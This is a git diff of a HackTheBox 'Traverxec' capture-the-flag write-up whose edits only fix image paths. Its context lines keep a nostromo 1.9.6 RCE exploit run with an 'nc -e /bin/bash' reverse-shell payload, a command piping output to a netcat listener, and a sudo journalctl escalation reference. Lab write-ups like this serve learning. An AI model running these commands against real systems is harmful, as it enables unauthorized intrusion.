@@ -4,9 +4,9 @@ author: yufong
 categories: [HackTheBox, HackTheBox - Linux]
 date: 2022-09-25
 tags: [linux-priv-esc/sudo/gtfo-bin]
-img_path: /Writeups/HackTheBox/Linux/Traverxec/images/
+img_path: /_posts/Writeups/HackTheBox/Linux/Traverxec/images/
 image:
-  src: Pasted%20image%2020220925012208.png
+  path: /_posts/Writeups/HackTheBox/Linux/Traverxec/images/Pasted%20image%2020220925012208.png
   width: 1000   # in pixels
   height: 400   # in pixels
 ---
@@ -53,7 +53,7 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 
 ## TCP/80 (HTTP) - nostromo/nhttpd 1.9.6 RCE
 1. Found out that `nostromo 1.9.6/nhttpd 1.9.6` webserver is running
-	![](Pasted%20image%2020220925014140.png)
+	![]({{ page.img_path }}Pasted%20image%2020220925014140.png)
 2. Search exploits for `nostromo 1.9.6`
 	
 	| Exploit Title                                                        | Path                     |
@@ -93,7 +93,7 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 		┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit]
 		└─# python2 47837.py traverxec.htb 80 'nc 10.10.14.14 4444 -e /bin/bash'
 		```
-		![](Pasted%20image%2020220925015312.png)
+		![]({{ page.img_path }}Pasted%20image%2020220925015312.png)
 
 
 ## TCP/80 (HTTP) - nostromo/nhttpd 1.9.6 RCE (Manual)
@@ -115,7 +115,7 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	echo
 	bash -c "id;whoami" | nc 10.10.14.14 4444
 	```
-	![](Pasted%20image%2020220925170508.png)
+	![]({{ page.img_path }}Pasted%20image%2020220925170508.png)
 	>Executed code is not reflected on the webpage, we have to pip `|` the executed commands into `netcat` to view it.
 	{: .prompt-info }
 2. Start `netcat` listener
@@ -186,7 +186,7 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	uid=33(www-data) gid=33(www-data) groups=33(www-data)
 	www-data@traverxec:/usr/bin$
 	```
-	![](Pasted%20image%2020220925054440.png)
+	![]({{ page.img_path }}Pasted%20image%2020220925054440.png)
 
 
 
@@ -394,6 +394,6 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 		```
 		/bin/sh
 		```
-		![](Pasted%20image%2020220925051459.png)
+		![]({{ page.img_path }}Pasted%20image%2020220925051459.png)
 1. Demo `SUDO GTFOBINS journalctl`
 	![](KqccceU2oq.gif)
